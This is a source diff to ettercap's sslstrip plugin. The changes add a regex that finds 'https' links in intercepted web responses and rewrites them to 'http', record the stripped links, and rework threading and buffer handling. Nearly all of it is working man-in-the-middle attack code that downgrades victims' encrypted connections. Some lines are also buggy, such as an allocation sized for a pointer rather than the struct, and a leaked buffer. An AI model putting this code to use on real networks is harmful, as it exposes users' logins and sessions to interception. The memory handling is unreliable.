@@ -33,6 +33,8 @@
 #include <sys/types.h>
 #include <sys/wait.h>
 
+#include <regex.h>
+
 #include <linux/netfilter_ipv4.h>
 
 
@@ -114,6 +116,8 @@ static int main_fd;
 static u_int16 bind_port;
 static struct pollfd poll_fd;
 
+static regex_t *find_https_re = NULL;
+
 /* protos */
 int plugin_load(void *);
 static int sslstrip_init(void *);
@@ -143,10 +147,11 @@ static void http_remove_https(struct http_connection *connection);
 static u_int http_receive_from_server(char *ptr, size_t size, size_t nmemb, void *userdata);
 static size_t http_write_to_server(void *ptr, size_t size, size_t nmemb, void *stream);
 
+
 /* thread stuff */
 static int http_bind_wrapper(void);
-static EC_THREAD_FUNC(http_accept_thread);
 static EC_THREAD_FUNC(http_child_thread);
+static EC_THREAD_FUNC(http_accept_thread);
 
 struct plugin_ops sslstrip_ops = {
 	ettercap_version:	EC_VERSION, /* must match global EC_VERSION */
@@ -174,13 +179,14 @@ static int sslstrip_init(void *dummy)
 	}
 	
 	/* start HTTP accept thread */
-	ec_thread_new("http_accept_thread", "wrapper for HTTP connections", &http_accept_thread, NULL);
 
 	/* add hook point in the dissector for HTTP traffic */
 	//hook_add(HOOK_PROTO_HTTP, &sslstrip);
 
 	hook_add(HOOK_HANDLED, &sslstrip);
 
+
+	ec_thread_new_detached("http_accept_thread", "HTTP Accept thread", &http_accept_thread, NULL, 1);
 	return PLUGIN_RUNNING;
 }
 
@@ -192,11 +198,14 @@ static int sslstrip_fini(void *dummy)
 		USER_MSG("Unable to remove HTTP redirect, please do so manually.");
 	}
 
-	/* stop accept wrapper */
-	pthread_t pid = ec_thread_getpid("http_accept_thread");
-	
-	if (!pthread_equal(pid, EC_PTHREAD_NULL))
-		ec_thread_destroy(pid);
+       /* stop accept wrapper */
+       pthread_t pid = ec_thread_getpid("http_accept_thread");
+       
+       if (!pthread_equal(pid, EC_PTHREAD_NULL))
+               ec_thread_destroy(pid);
+
+	if (find_https_re != NULL)
+		regfree(find_https_re);
 
 	return PLUGIN_FINISHED;
 }
@@ -697,14 +706,21 @@ static u_int http_receive_from_server(char *ptr, size_t size, size_t nmemb, void
 
 		memcpy(connection->buffer, ptr, size*nmemb);
 	} else {
-		char *b = realloc(connection->buffer, connection->len+(size*nmemb));
-		
-		if (b == NULL)
-			return 0;
+		//char *b = realloc(connection->buffer, connection->len+(size*nmemb));
+		char *b;
 
-		memcpy(b, ptr, size*nmemb);
+		SAFE_CALLOC(b, 1, connection->len+(size*nmemb));
+		BUG_IF(b == NULL);
+	
+		memcpy(b, connection->buffer, connection->len);	
+		memcpy(b+connection->len, ptr, size*nmemb);
+		connection->buffer = b;
 		DEBUG_MSG("SSLStrip: Buffer contains %s", connection->buffer);
 	}
+
+	connection->len += size*nmemb;
+
+	DEBUG_MSG("SSLStrip: Connection buffer len now is %ld", connection->len);
 
 	return size*nmemb;
 }
@@ -756,7 +772,7 @@ EC_THREAD_FUNC(http_child_thread)
 	
 }
 
-
+#if 0
 static void http_remove_https(struct http_connection *connection)
 {
 
@@ -821,6 +837,70 @@ static void http_remove_https(struct http_connection *connection)
                  end += with_len - slen;
 
         } while (ptr != NULL && ptr < end);
+
+        /* Iterate through all http_request and remove any that have not been used lately */
+        struct https_link *link_tmp;
+        time_t now = time(NULL);
+
+        LIST_FOREACH_SAFE(l, &connection->links, next, link_tmp) {
+                if(now - l->last_used >= REQUEST_TIMEOUT) {
+                        LIST_REMOVE(l, next);
+                        SAFE_FREE(l);
+                }
+        }
+}
+
+#endif
+
+static void http_remove_https(struct http_connection *connection)
+{
+	regmatch_t match[5];
+	char *buf_cpy = strndup(connection->buffer, connection->len);
+	char *scroll = buf_cpy;
+
+	char http[] = " http";
+	size_t https_len = strlen("https");
+	char *host, *path;
+	struct https_link *l;
+
+	if (find_https_re == NULL) {
+		SAFE_CALLOC(find_https_re, 1, sizeof(regex_t));
+		BUG_IF(find_https_re==NULL);
+
+		if (regcomp(find_https_re, "(href=|src=|url\\(|action=)?[\"']?(https)://([^ \r\\)/\"'>\\)]*)/?([^ \\)\"'>\\)\r]*)", REG_EXTENDED | REG_NEWLINE | REG_ICASE))
+		{
+			ERROR_MSG("SSLStrip: Error compiling regular expresion\n");
+			return;
+		}
+	}
+
+
+	while(!regexec(find_https_re, buf_cpy, 5, match, REG_NOTBOL))
+	{
+		host = strndup(buf_cpy + match[3].rm_so, match[3].rm_eo - match[3].rm_so);
+		/* if we have an empty path */
+		if (match[4].rm_so != -1 && match[4].rm_so != match[4].rm_eo)
+			path = strndup(buf_cpy + match[4].rm_so, match[4].rm_eo - match[4].rm_so);
+		else
+			path = strdup("/");
+
+		/* we don't add root url without href,src,action or url */
+		if (strcmp(path, "/") != 0 || match[1].rm_so != -1) {
+			SAFE_CALLOC(l, 1, sizeof(struct https_link *));
+			BUG_IF(l==NULL);
+
+			l->url = (char *)malloc(strlen(host)+strlen(path)+1);
+			memset(l->url, '\0', strlen(host)+strlen(path)+1);
+			snprintf(l->url, strlen(host)+strlen(path), "%s%s", host, path);
+			l->last_used = time(NULL);
+		
+			//Add to list	
+			LIST_INSERT_HEAD(&connection->links, l, next);
+		}
+
+		memcpy(connection->buffer +((buf_cpy+match[2].rm_so)-scroll), http, https_len);
+		buf_cpy += match[3].rm_eo;
+	}
 
         /* Iterate through all http_request and remove any that have not been used lately */
         struct https_link *link_tmp;
@@ -937,6 +1017,9 @@ static void http_wipe_connection(struct http_connection *connection)
 {
 	close_socket(connection->fd);
 	curl_easy_cleanup(connection->handle);
+
+	if(connection->buffer)
+		SAFE_FREE(connection->buffer);
 
 	if (connection)
 		SAFE_FREE(connection);
